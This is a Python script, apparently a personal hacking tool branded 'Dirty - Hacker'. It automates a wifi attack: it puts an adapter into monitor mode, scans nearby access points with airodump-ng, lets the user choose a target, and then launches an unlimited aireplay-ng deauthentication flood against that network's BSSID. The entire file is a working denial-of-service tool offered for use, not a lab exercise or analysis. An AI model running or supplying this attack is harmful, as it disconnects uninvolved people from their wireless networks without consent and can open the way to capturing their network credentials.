import subprocess
import re
import pyfiglet
import csv
import os
import time
import shutil
from datetime import datetime
from colorama import Fore, Back, Style

# create a list for wifi information
active_wireless_networks = []
# for check and break while loop we use below
def check_for_wifi_id(wifi_id, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if wifi_id in item["ESSID"]:
            check_status = False
    return check_status

# for interface 
print()
print('****************************************************************')  
print()
print(Fore.RED + pyfiglet.figlet_format("Dirty - Hacker") + Style.RESET_ALL)
print()
print('****************************************************************')
print("\n*          My github is : https://github.com/yasin-pro/        *")
print()
print('****************************************************************')
print()

# for we shure run this script with sudo permission
if not 'SUDO_UID' in os.environ.keys():
    print(Fore.GREEN+" [+] " +Fore.RED+"Run this script with super user permission ! "+Style.RESET_ALL)
    print()
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")

# create a list with my wifi adapter 
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print(Fore.GREEN+" [+] " +Fore.RED+"You must connect a wifi adapter"+Style.RESET_ALL)
    print()
    exit()

print(Fore.GREEN+" [+] "+Fore.WHITE+"The wifi adapter are available : " +Style.RESET_ALL )
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select your wifi adapter : ")
    try:
        # choice wifi in my wifi adapter list
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print(Fore.GREEN+" [+] "+Fore.RED + "Enter a correct number ! "+Style.RESET_ALL)

# choices wifi in variavble 
hacknic = check_wifi_result[int(wifi_interface_choice)]

# interface for tel we to go to kill process
print(Fore.GREEN+" [+] "+Fore.GREEN+"Wifi adapter connected ! "+Style.RESET_ALL)
print(Fore.RED + "Now let's kill conflicting processes : " + Style.RESET_ALL) 

# You must install airmon-ng
# run process airmon-ng and put in variable but we want just run
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# for interface to tell we go to wifi adapter monitoring
print(Fore.GREEN+" [+] "+Fore.RED+"Wifi adapter go to monitoring mode : "+Style.RESET_ALL)

# start airmon-ng with my choices wifi adapter
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
# and show me we adapter wifi access points
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# for interface and search and show wifi around we and append on we list
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_wifi_id(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print(Fore.GREEN+" [+] "+Fore.RED+"We are scannig... Press Ctrl+C when you find wich wireless to attack ! \n"+Style.RESET_ALL)
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    print(Fore.GREEN+" [+] "+Fore.RED+"\nChoice ! "+Style.RESET_ALL)

while True:
    choice = input(Fore.GREEN+" [+] "+Fore.RED+"Select from above : "+Style.RESET_ALL)
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print(Fore.RED+"Try again ! "+Style.RESET_ALL)

# and run code for attack
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

